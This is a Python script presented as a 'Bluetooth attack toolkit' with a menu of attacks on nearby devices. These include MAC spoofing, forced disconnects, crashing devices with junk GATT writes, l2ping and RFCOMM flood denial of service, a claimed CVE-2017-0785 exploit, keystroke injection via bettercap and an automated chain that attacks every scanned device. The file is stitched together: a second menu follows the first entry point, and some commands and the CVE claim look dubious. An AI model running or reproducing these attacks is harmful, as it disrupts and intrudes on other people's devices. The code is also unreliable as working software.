#!/usr/bin/env python3
"""
ZeroSync v7.1 – Ultimate Bluetooth Attack Toolkit
Author: Null_Lyfe
"""

import os
import sys
import time
import random
import subprocess
from datetime import datetime
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, BTLEException, ADDR_TYPE_PUBLIC, ADDR_TYPE_RANDOM
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress
from rich import box

console = Console()
seen_devices = {}

class BLEHandler(DefaultDelegate):
    def __init__(self): super().__init__()
    def handleNotification(self, cHandle, data): console.print(f"[yellow]📥 Notification: {data}[/yellow]")

def scan_devices():
    console.print("[cyan]🔎 Scanning for BLE devices...[/cyan]")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for idx, d in enumerate(devices):
            mac = d.addr
            rssi = d.rssi
            if mac not in seen_devices:
                seen_devices[mac] = {"first_seen": datetime.now().strftime("%H:%M:%S"), "max_rssi": rssi}
            else:
                seen_devices[mac]["max_rssi"] = max(seen_devices[mac]["max_rssi"], rssi)
            console.print(f"[magenta]{idx}[/magenta]: {mac} RSSI={rssi} dB")
        return devices
    except BTLEException as e:
        console.print(f"[red]❌ Scan error: {e}[/red]")
        return []

def view_scan_log():
    if not seen_devices:
        console.print("[red]⚠️ No devices scanned yet.[/red]")
        return
    t = Table(title="Scan Log", box=box.SIMPLE)
    t.add_column("MAC", style="magenta")
    t.add_column("First Seen", style="cyan")
    t.add_column("Max RSSI", justify="right")
    for mac, meta in seen_devices.items():
        t.add_row(mac, meta["first_seen"], str(meta["max_rssi"]))
    console.print(t)

def spoof_mac():
    new_mac = Prompt.ask("🎭 Enter new MAC address")
    os.system("sudo ifconfig hci0 down")
    os.system(f"sudo bdaddr -i hci0 {new_mac}")
    os.system("sudo ifconfig hci0 up")
    console.print("[green]✅ MAC spoofed successfully.[/green]")

def stealth_mode():
    subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "discoverable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "pairable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["hciconfig", "hci0", "noscan"], stdout=subprocess.DEVNULL)
    console.print("[magenta]🕶️ BLE stealth mode activated[/magenta]")

def broadcast_names():
    names = ["UFO_SCAN", "NSA_Van", "💀 ZeroSync 💀", "Free_Wifi", "BLE_BOMB"]
    try:
        while True:
            for n in names:
                subprocess.run(["bluetoothctl", "system-alias", n], stdout=subprocess.DEVNULL)
                console.print(f"[blue]📡 Broadcasting as {n}[/blue]")
                time.sleep(1.5)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        console.print("[red]🛑 Advertising stopped.[/red]")

def export_logs():
    os.makedirs("zerosync_logs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"zerosync_logs/session_{timestamp}.log"
    with open(path, "w") as f:
        for mac, meta in seen_devices.items():
            vendor = "UnknownVendor"
            f.write(f"{mac} ({vendor}) | Seen: {meta['first_seen']} | Max RSSI: {meta['max_rssi']}\n")
    console.print(f"[green]📁 Logs saved to {path}[/green]")


def crash_device():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💥 Crash index"))
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_PUBLIC)
        for _ in range(30):
            p.writeCharacteristic(0x000b, os.urandom(30), withResponse=False)
            console.print(f"[red]💣 Sent junk to {addr}[/red]")
            time.sleep(0.2)
    except Exception as e:
        console.print(f"[dim]⚠️ Crash error: {e}[/dim]")

def ble_deauth():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("✂️ Index to deauth"))
    addr = devices[idx].addr
    for i in range(20):
        subprocess.run(["hcitool", "dc", addr], stdout=subprocess.DEVNULL)
        console.print(f"[red]✂️ Deauth packet sent to {addr} ({i+1})[/red]")
        time.sleep(0.3)

def cve_2017_0785():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💣 CVE target index"))
    addr = devices[idx].addr
    console.print(f"[cyan]Launching CVE-2017-0785 sequence on {addr}[/cyan]")
    subprocess.run(["l2ping", "-c", "3", "-s", "800", addr], stdout=subprocess.DEVNULL)
    subprocess.run(["sdptool", "browse", addr], stdout=subprocess.DEVNULL)
    subprocess.run(["l2ping", "-c", "5", "-s", "2048", addr], stdout=subprocess.DEVNULL)
    console.print("[green]✅ CVE packet sequence dispatched[/green]")

def replay_notification():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💌 Replay index"))
    msg = Prompt.ask("💌 Message to spam").encode()
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLEHandler())
        for _ in range(25):
            p.writeCharacteristic(0x0001, msg)
            console.print(f"[green]💌 Spammed {msg.decode(errors='ignore')}[/green]")
            time.sleep(0.5)
    except Exception as e:
        console.print(f"[red]Replay error: {e}[/red]")

def rfcomm_flood():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📡 Index for RFCOMM flood"))
    addr = devices[idx].addr
    for i in range(10):
        try:
            subprocess.run(["rfcomm", "connect", addr, "1"], timeout=3)
            console.print(f"[cyan]Attempt {i+1}: RFCOMM sent[/cyan]")
        except:
            console.print(f"[dim]Timeout or fail on attempt {i+1}[/dim]")

def l2ping_dos():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📶 L2Ping DoS index"))
    addr = devices[idx].addr
    console.print(f"[yellow]Pinging {addr} with L2Ping flood...[/yellow]")
    subprocess.run(["l2ping", "-s", "600", "-f", addr])

def bettercap_bridge():
    os.system("gnome-terminal -- bettercap -eval 'ble.recon on; ble.enum on; net.probe on'")
    console.print("[cyan]💉 Bettercap BLE recon started in terminal[/cyan]")

def zerojam_mesh_engine():
    console.print("[magenta]📡 ZeroJam Mesh Engine: Spamming beacon mesh...[/magenta]")
    names = ["💀ZeroMesh", "👾x0x0", "📡NodeHack", "🧠BLEBot", "ZeroSyncNet"]
    try:
        while True:
            for alias in names:
                subprocess.run(["bluetoothctl", "system-alias", alias], stdout=subprocess.DEVNULL)
                time.sleep(0.5)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        console.print("[red]🛑 ZeroJam Mesh stopped.[/red]")

def audio_deception():
    console.print("[cyan]🔊 Starting audio deception loop (requires pulseaudio + audio files)...[/cyan]")
    sounds = ["alert1.wav", "click2.wav", "ping3.wav"]
    try:
        while True:
            sound = random.choice(sounds)
            subprocess.run(["paplay", sound], stdout=subprocess.DEVNULL)
            time.sleep(random.uniform(2, 5))
    except KeyboardInterrupt:
        console.print("[red]🛑 Audio deception stopped.[/red]")


def main_menu():
    while True:
        console.print(Panel("[bold cyan]ZeroSync v7.1 – Created by Null_Lyfe[/bold cyan]", border_style="bright_magenta"))
        t = Table(title="ZeroSync Control Center", box=box.DOUBLE_EDGE)
        t.add_column("ID", justify="center", style="magenta")
        t.add_column("Function", style="cyan")

        t.add_row("1", "🔍 Scan for BLE Devices")
        t.add_row("2", "📜 View Scan Log")
        t.add_row("3", "🎭 MAC Spoofing")
        t.add_row("4", "🕶️ Stealth Mode")
        t.add_row("5", "📡 Broadcast Aliases")
        t.add_row("6", "✂️ Deauth BLE Device")
        t.add_row("7", "💣 Crash BLE Device")
        t.add_row("8", "💌 Replay Notification Spam")
        t.add_row("9", "📶 RFCOMM Flood")
        t.add_row("10", "💥 L2Ping DoS")
        t.add_row("11", "🧨 Exploit CVE-2017-0785")
        t.add_row("12", "🧠 Bettercap BLE Bridge")
        t.add_row("13", "🌐 ZeroJam Mesh Engine")
        t.add_row("14", "🔊 Audio Deception")
        t.add_row("15", "📁 Export Logs")
        t.add_row("0", "🚪 Exit")

        console.print(t)
        choice = Prompt.ask("[bold magenta]💜 Choose wisely[/bold magenta]")

        if choice == "1": scan_devices()
        elif choice == "2": view_scan_log()
        elif choice == "3": spoof_mac()
        elif choice == "4": stealth_mode()
        elif choice == "5": broadcast_names()
        elif choice == "6": ble_deauth()
        elif choice == "7": crash_device()
        elif choice == "8": replay_notification()
        elif choice == "9": rfcomm_flood()
        elif choice == "10": l2ping_dos()
        elif choice == "11": cve_2017_0785()
        elif choice == "12": bettercap_bridge()
        elif choice == "13": zerojam_mesh_engine()
        elif choice == "14": audio_deception()
        elif choice == "15": export_logs()
        elif choice == "0":
            console.print("[bold red]Exiting ZeroSync. Stay anonymous.[/bold red]")
            break
        else:
            console.print("[red]⚠️ Invalid choice. Try again.[/red]")

if __name__ == "__main__":
    main_menu()


# 🧠 Device Fingerprint Engine
def fingerprint_device(mac):
    try:
        output = subprocess.check_output(["bluetoothctl", "info", mac]).decode()
        console.print(f"[blue]📋 Device Info for {mac}:[/blue]\n{output}")
    except Exception as e:
        console.print(f"[red]❌ Failed to fingerprint: {e}[/red]")

# 🎮 BLE HID Spoofing (keyboard emulation via bettercap or HID tool)
def ble_hid_spoof():
    console.print("[cyan]🎮 Launching BLE HID spoofing attack...[/cyan]")
    try:
        subprocess.run("bettercap -eval 'set ble.recon on; set ble.hid.keyboard on; ble.hid.keyboard Hello from ZeroSync!;'", shell=True)
        console.print("[green]✅ BLE HID spoof sent.[/green]")
    except Exception as e:
        console.print(f"[red]⚠️ HID spoofing error: {e}[/red]")

# 🧪 GATT Service Injection (Gattacker-like)
def gatt_service_spoof():
    console.print("[yellow]🧪 Starting GATT profile cloning spoof...[/yellow]")
    try:
        subprocess.run("bettercap -eval 'set ble.recon on; ble.gatt.spoof on'", shell=True)
        console.print("[green]✅ GATT Spoofing active.[/green]")
    except Exception as e:
        console.print(f"[red]❌ GATT Spoof error: {e}[/red]")

# 📶 BLE Mesh Attack Module
def mesh_injection():
    console.print("[magenta]📡 Launching BLE Mesh packet fuzzing...[/magenta]")
    try:
        subprocess.run("bettercap -eval 'ble.mesh on; ble.mesh.flood on'", shell=True)
        console.print("[green]✅ BLE Mesh fuzzing running.[/green]")
    except Exception as e:
        console.print(f"[red]⚠️ Mesh attack error: {e}[/red]")

# 🎧 Audio Payload Injection
def audio_deception():
    console.print("[cyan]🔊 Injecting fake BLE audio interaction...[/cyan]")
    try:
        subprocess.run("bettercap -eval 'ble.recon on; ble.audio.spoof on'", shell=True)
        console.print("[green]✅ Audio deception triggered.[/green]")
    except Exception as e:
        console.print(f"[red]❌ Audio spoof error: {e}[/red]")

# 🔥 CVE Launcher (Multi)
def launch_advanced_cves():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💣 Select device index"))
    addr = devices[idx].addr
    console.print(f"[blue]Launching multi-CVE sequence on {addr}...[/blue]")
    try:
        subprocess.run(["l2ping", "-s", "600", "-c", "5", addr])
        subprocess.run(["sdptool", "browse", addr])
        subprocess.run(["l2ping", "-f", "-s", "1024", addr])
        console.print("[green]✅ CVE packets sent[/green]")
    except Exception as e:
        console.print(f"[red]❌ CVE error: {e}[/red]")

# 🤖 Automated Attack Chain
def auto_attack_chain():
    console.print("[cyan]🤖 Running Auto Attack Chain...[/cyan]")
    devices = scan_devices()
    if not devices: return
    for dev in devices:
        mac = dev.addr
        rssi = dev.rssi
        console.print(f"[magenta]Target: {mac} RSSI={rssi}[/magenta]")
        fingerprint_device(mac)
        subprocess.run(["l2ping", "-c", "3", "-s", "600", mac])
        subprocess.run("bettercap -eval 'ble.hid.keyboard Hello from AutoChain!'", shell=True)
        time.sleep(2)
    console.print("[green]✅ Chain complete[/green]")



# 🧠 Add New Menu Options
def main_menu():
    while True:
        console.print(Panel("[bold cyan]ZeroSync v7.2 – Created by Null_Lyfe[/bold cyan]", border_style="bright_magenta"))
        t = Table(title="Main Menu", box=box.ROUNDED)
        t.add_column("ID", justify="center", style="magenta")
        t.add_column("Action", style="white")
        t.add_row("1", "Scan for BLE Devices")
        t.add_row("2", "View Scan History")
        t.add_row("3", "MAC Spoofing")
        t.add_row("4", "Stealth Mode")
        t.add_row("5", "Broadcast Aliases")
        t.add_row("6", "Deauth BLE Device")
        t.add_row("7", "Crash BLE Device")
        t.add_row("8", "Replay Notification Spam")
        t.add_row("9", "RFCOMM Flood")
        t.add_row("10", "L2Ping DoS")
        t.add_row("11", "Exploit CVE-2017-0785")
        t.add_row("12", "Bettercap BLE Bridge")
        t.add_row("13", "Export Scan Logs")
        t.add_row("14", "BLE HID Spoof")
        t.add_row("15", "GATT Profile Spoof")
        t.add_row("16", "BLE Mesh Injection")
        t.add_row("17", "Launch Advanced CVEs")
        t.add_row("18", "Device Fingerprinting")
        t.add_row("19", "Audio Spoofing")
        t.add_row("20", "Automated Attack Chain")
        t.add_row("0", "Exit")
        console.print(t)
        choice = Prompt.ask("💜 Select option")
        if choice == "1": scan_devices()
        elif choice == "2": view_scan_log()
        elif choice == "3": spoof_mac()
        elif choice == "4": stealth_mode()
        elif choice == "5": broadcast_names()
        elif choice == "6": ble_deauth()
        elif choice == "7": crash_device()
        elif choice == "8": replay_notification()
        elif choice == "9": rfcomm_flood()
        elif choice == "10": l2ping_dos()
        elif choice == "11": cve_2017_0785()
        elif choice == "12": bettercap_bridge()
        elif choice == "13": export_logs()
        elif choice == "14": ble_hid_spoof()
        elif choice == "15": gatt_service_spoof()
        elif choice == "16": mesh_injection()
        elif choice == "17": launch_advanced_cves()
        elif choice == "18": 
            mac = Prompt.ask("🔍 MAC address to fingerprint")
            fingerprint_device(mac)
        elif choice == "19": audio_deception()
        elif choice == "20": auto_attack_chain()
        elif choice == "0": 
            console.print("[bold red]Exiting...[/bold red]"); break
        else: console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    main_menu()
